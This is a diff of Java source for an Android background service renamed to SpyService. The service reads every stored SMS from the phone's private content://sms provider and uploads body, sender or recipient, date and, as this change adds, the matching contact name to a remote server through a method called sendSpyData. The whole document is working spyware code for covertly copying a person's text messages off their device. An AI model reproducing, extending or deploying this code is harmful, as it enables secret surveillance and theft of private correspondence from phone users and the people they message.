@@ -8,18 +8,21 @@ import android.net.Uri;
 import android.os.IBinder;
 import android.util.Log;
 
-public class SmsService extends Service {
+public class SpyService extends Service {
 
 	private static final String SMS_RECEIVED_TITLE = "SMS from ";
 	private static final String SMS_SENT_TITLE = "SMS to ";
-	private static final Uri SMS_URI = Uri.parse("content://sms"); //<--- This is not a public api
+	private static final Uri SMS_URI = Uri.parse("content://sms"); // <--- This
+																	// is not a
+																	// public
+																	// api
 	private static final String[] SMS_COLUMNS = { "_id", "date", "body", "address", "protocol" };
 	private static final String PREF_LAST_SMS_DATE = "smsDate";
 
 	@Override
 	public void onCreate() {
 
-		Log.i(SetupActivity.TAG, "Starting SmsService..");
+		Log.i(SetupActivity.TAG, "Starting SpyService..");
 
 	}
 
@@ -32,21 +35,21 @@ public class SmsService extends Service {
 
 		final SharedPreferences prefs = Prefs.get(this);
 		SharedPreferences.Editor prefsEdit = prefs.edit();
-		
-		//Wait 10 seconds to make sure the sms content provider has stabilized. 
+
+		// Wait 10 seconds to make sure the sms content provider has stabilized.
 		try {
 			Thread.sleep(10000);
 		} catch (InterruptedException e) {
-			//pass, if we get interrupted...so what?
+			// pass, if we get interrupted...so what?
 		}
 
-		
 		String currentTime = String.valueOf(System.currentTimeMillis());
 		Log.i(SetupActivity.TAG, "Current Time: " + currentTime);
 
-		//On first run, this default value will cause EVERY SMS to be transmitted to server
+		// On first run, this default value will cause EVERY SMS to be
+		// transmitted to server
 		String lastDate = prefs.getString(PREF_LAST_SMS_DATE, "1");
-		
+
 		Log.i(SetupActivity.TAG, "lastDate: " + lastDate);
 
 		// Get all SMS that have happened since our remembered date
@@ -80,13 +83,19 @@ public class SmsService extends Service {
 								.getString(cursor.getColumnIndexOrThrow("protocol"));
 
 						String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
-
+						String contactName = ContactsUtility.getPhoneNumber(getContentResolver(),
+								address);
 						AppEngineClient client = new AppEngineClient(devID);
 						String title;
 						if (protocol == null) {
-							title = SMS_SENT_TITLE + address;
+							title = SMS_SENT_TITLE;
 						} else {
-							title = SMS_RECEIVED_TITLE + address;
+							title = SMS_RECEIVED_TITLE;
+						}
+						if (!contactName.isEmpty()) {
+							title += contactName;
+						} else {
+							title += address;
 						}
 						client.sendSpyData(title, body, date);
 					} while (cursor.moveToNext());
